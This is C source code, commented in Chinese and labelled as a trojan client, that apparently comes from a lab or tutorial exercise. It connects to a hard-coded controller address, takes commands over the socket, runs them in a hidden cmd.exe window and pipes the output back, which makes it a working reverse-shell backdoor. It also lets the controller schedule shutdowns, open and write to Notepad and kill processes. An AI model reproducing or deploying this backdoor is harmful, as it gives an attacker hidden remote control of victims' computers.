//（2）木马客户端程序：
#include <Winsock2.h>
#include <stdio.h>
#pragma comment(lib, "ws2_32.lib")	//静态加入一个lib文件,也就是库文件
#include <stdlib.h>
#include<tchar.h>	//可用于双字节字符串，使程序可以用于多种语言文字处理
#include <windows.h>
#include <string>
#include <tlhelp32.h> 
#include<time.h>


#define MSG_LEN 1024

PROCESS_INFORMATION process_info;	//设置必备参数 process_info,保存启动后的进程相关信息

SOCKET sockClient; // 客户端 Scoket
HANDLE hRead;		//制定一个句柄



bool IsProcessRun(char *pName)	//判断当前程序是否已存在活动实例
{
	//--------------------初始化--------------------
	HANDLE hProcessSnap = NULL;
	HANDLE hProcess;
	PROCESSENTRY32 pe32;//PROCESSENTRY32是进程快照的结构体
	DWORD dwPriorityClass;
	int count = 0;
	//--------------------初始化end--------------------

	hProcessSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);	//给系统内所有的进程拍快照
	if (hProcessSnap == INVALID_HANDLE_VALUE)	//调用失败
	{
		return false;
	}

	pe32.dwSize = sizeof(PROCESSENTRY32);//实例化后使用Process32First获取第一个快照的进程前必做的初始化操作

	int jud = Process32Next(hProcessSnap, &pe32);	 // 遍历进程快照，轮流显示每个进程的信息
	while (jud)
	{
		dwPriorityClass = 0;
		if (_stricmp(pName , pe32.szExeFile) == 0)
		{
			count++;
		}
		jud = Process32Next(hProcessSnap, &pe32);
	}
	if (count >= 1)
	{
		return true;
	}
	else
	{
		return false;
	}

}
int createproc1()	//获得外部程序返回值
{
	STARTUPINFO si1 = { sizeof(si1) };	//将cb成员初始化为sizeof(si)，其他成员初始化为0
	PROCESS_INFORMATION pi1;	//设置必备参数pi1,保存启动后的进程相关信息
	ZeroMemory(&pi1, sizeof(pi1));	//将指定的内存块清零
	ZeroMemory(&si1, sizeof(si1));
	TCHAR szCommandLine1[] = TEXT("101010.exe");	//?
	si1.wShowWindow = TRUE;	//此成员设为TRUE的话则显示新建进程的主窗口
	CreateProcess(szCommandLine1, NULL, NULL, NULL, FALSE, NULL, NULL, NULL, &si1, &pi1);	//创建一个新进程  
	return 0;
}




void post(char *msg)
{
    send(sockClient, msg, strlen(msg) + 1, 0);
    
}
 
DWORD WINAPI ThreadProc (LPVOID lpThreadParameter)
{
    char buf[2048] = {0};    //缓冲区
    DWORD len = 0;
    
   
    while (ReadFile( hRead, buf, MSG_LEN, &len, NULL ))	 // 读管道内容,并显示
    {
        post( buf );
        ZeroMemory( buf, MSG_LEN );
        Sleep(800);
    }
    CloseHandle( hRead );
    return 0;
}
 
int cmd(char *cmdStr, char *message)
{
    char command[1024] = {0};
    char buf[MSG_LEN] = {0};    //缓冲区
 
    HANDLE hWrite;
    STARTUPINFO si;         // 启动配置信息
    PROCESS_INFORMATION pi; // 进程信息
    SECURITY_ATTRIBUTES sa; // 管道安全属性
 
    DWORD Tid;
 
    
    sprintf(command, "cmd.exe /c %s", cmdStr);	// 拼接 cmd 命令
    
 
    // --------------------配置管道安全属性--------------------
    sa.nLength = sizeof( sa );
    sa.bInheritHandle = TRUE; // 管道句柄是可被继承的
    sa.lpSecurityDescriptor = NULL;
   // --------------------配置管道安全属性end--------------------

    
    if( !CreatePipe(&hRead, &hWrite, &sa, 1024))	// 创建匿名管道，管道句柄是可被继承的
    {
        printf( "管道创建失败! Error: %x\n", (unsigned int)GetLastError() );	//创建失败
        return 1;
    }
 
    // --------------------配置 cmd 启动信息--------------------
    ZeroMemory( &si, sizeof( si ) );
    si.cb = sizeof( si ); // 获取兼容大小
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW; // 标准输出等使用额外的
    si.wShowWindow = SW_HIDE;               // 隐藏窗口启动
    si.hStdOutput = si.hStdError = hWrite;  // 输出流和错误流指向管道写的一头
    // --------------------配置 cmd 启动信息end--------------------

   
    if ( !CreateProcess(	 // 创建子进程,运行命令,子进程是可继承的
        NULL,       // 不传程序路径, 使用命令行    
        command,    // 命令行命令        
        NULL,        
        NULL,        
        TRUE,      
        0,          
        NULL,       
        NULL,       
        &si,        // STARTUPINFO 结构存储启动信息
        &pi ) )     // PROCESS_INFORMATION 保存启动后的进程相关信息 
    {
        printf( "创建进程失败! Error: %x\n", (unsigned int)GetLastError() );
        CloseHandle( hRead );
        CloseHandle( hWrite );
        return 1;
    }
     
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle( hWrite );
 
    CreateThread(
        NULL,       // 不能被子进程继承
        0,          // 默认堆栈大小
        ThreadProc, // 线程调用函数过程
        hRead,      // 传递参数
        0,          // 创建后立即执行
        &Tid        // 保存创建后的线程ID
    );
 
    // TODO:: 结束上一次线程
 
    return 0;
}

BOOL CreateNotepad()
{
    BOOL flag;
    STARTUPINFO start_info;	////STARTUPINFO 是一个结构体，该结构用于指定新进程的主窗口特性;start_info为定义的变量
 
    ZeroMemory( &process_info, sizeof(process_info) );
    ZeroMemory( &start_info, sizeof(start_info) );
 
    start_info.cb = sizeof(start_info);
 
    flag = CreateProcess( 
        NULL,           // 不传程序路径, 使用命令行
        "notepad.exe",  // 命令行命令
        NULL,           // 不继承进程句柄(默认)
        NULL,           // 不继承线程句柄(默认)
        FALSE,          // 不继承句柄(默认)
        0,              // 没有创建标志(默认)
        NULL,           // 使用默认环境变量
        NULL,           // 使用父进程的目录
        &start_info,    // STARTUPINFO 结构
        &process_info );// PROCESS_INFORMATION 保存相关信息
 
    if ( !flag )
    {
        printf( "创建失败 Error: (%d).\n", GetLastError() );
        return 0;
    }
    return 1;
}
 
/*
  将字符串写到记事本的 RichEdit 控件中
 */
void WriteNotepadText(char *str)
{
    char text[250];
    HWND hNotepad = FindWindow(TEXT("Notepad"), NULL);
    HWND hEdit = FindWindowEx(hNotepad, NULL, TEXT("Edit"), NULL);
    wsprintf(text, "%s\r\n", str);
    SendMessage(hEdit, EM_REPLACESEL, NULL, (LPARAM)text);
}
 
/*
  关闭记事本
 */
void CloseNotepad()		// 关闭进程句柄和线程句柄
{
    
    DWORD dwDesiredAccess = PROCESS_TERMINATE;	//访问选项,PROCESS_TERMINATE是在一个进程中强制结束其他的进程的标志
    BOOL  bInheritHandle  = FALSE;	//能否继承; True 表示能用 CreateProcess 继承句柄创建新进程
    HANDLE hProcess = OpenProcess(dwDesiredAccess, bInheritHandle, process_info.dwProcessId);	//返回进程的句柄
    if (hProcess == NULL)
        return;
    TerminateProcess(hProcess, 0);	//强制结束其他进程
    CloseHandle(hProcess);
}
 
/*
  判断 text 字符串是否以 begin 字符串开头
 */
BOOL strstart(char *text, char *begin)
{
    while(*begin)
        if (*begin++ != *text++)
            return FALSE;
    return TRUE;
}

int run(char *recvCmd, char *message)
{
    if (strcmp(recvCmd, "test") == 0)
    {
        strcpy(message, "服务端你好，有什么事吗~");
    }
    else if (strcmp(recvCmd, "shutdown") == 0)
    {
        
        system("shutdown -s -t 1800");		// 执行关机命令，设定时关机
        strcpy(message, "客户端将在 30 分钟后关闭");
    }
    else if (strcmp(recvCmd, "cancel") == 0)
    {
       
        system("shutdown -a");		 // 注销关机命令
        strcpy(message, "客户端定时关机已取消");
    }

	else if (strcmp(recvCmd, "open") == 0)
    {
        if(CreateNotepad())
        {
            strcpy(message, "记事本创建成功");
        } else {
            strcpy(message, "记事本创建失败!");
        }
    }
    else if (strcmp(recvCmd, "close") == 0)
    {
        CloseNotepad();
        strcpy(message, "Closed.");
    }
    else if (strstart(recvCmd, "write"))
    {
        WriteNotepadText(recvCmd + sizeof("write"));
        strcpy(message, "send");
    }

    else if (strcmp(recvCmd, "exit") == 0)
    {
        return 1;
    }
    else
    {
        
        cmd(recvCmd, message);	// 调用 cmd
    }
    return 0;
}
void main()
{
    int err = 0;
    char message[MSG_LEN] = {0};
    char recvCmd[100] = {0};
 
    SOCKET sockClient; // 客户端 Scoket
    SOCKADDR_IN addrServer; // 服务端地址
 
    WSADATA wsaData;
    WORD wVersionRequested;
 
    wVersionRequested = MAKEWORD( 2, 2 );
 
    err = WSAStartup( wVersionRequested, &wsaData );
 
    if ( err != 0 )
    {
        return;
    }
 
    if ( LOBYTE( wsaData.wVersion ) != 2 || HIBYTE( wsaData.wVersion ) != 2 )
    {
        // 启动错误，程序结束
        WSACleanup( );
        return;
    }
 
    // 新建客户端 scoket
    sockClient = socket(AF_INET, SOCK_STREAM, 0);
 
    // 定义要连接的服务端地址
    addrServer.sin_addr.S_un.S_addr = inet_addr("192.168.28.128");  // 目标IP (127.0.0.1是本机地址)
    addrServer.sin_family = AF_INET;                           // 协议类型是INET
    addrServer.sin_port = htons(6000);                         // 连接端口1234
 
    // 让 sockClient 连接到 服务端
    connect(sockClient, (SOCKADDR *)&addrServer, sizeof(SOCKADDR));
 
    while(1)
    {
        // 清空字符串
        ZeroMemory(recvCmd, sizeof(recvCmd));
        ZeroMemory(message, sizeof(message));
        // 从服务端获取数据
        recv(sockClient, recvCmd, MSG_LEN, 0);
        // 打印数据
        printf("-- 收到命令: [%s]n", recvCmd);
 
        run(recvCmd, message);
 
        if (strlen(recvCmd) > 0)
        {
            // 发送数据到服务端
            send(sockClient, message, strlen(message) + 1, 0);
        }
    }
 
    // 关闭socket
    closesocket(sockClient);
    WSACleanup();
}
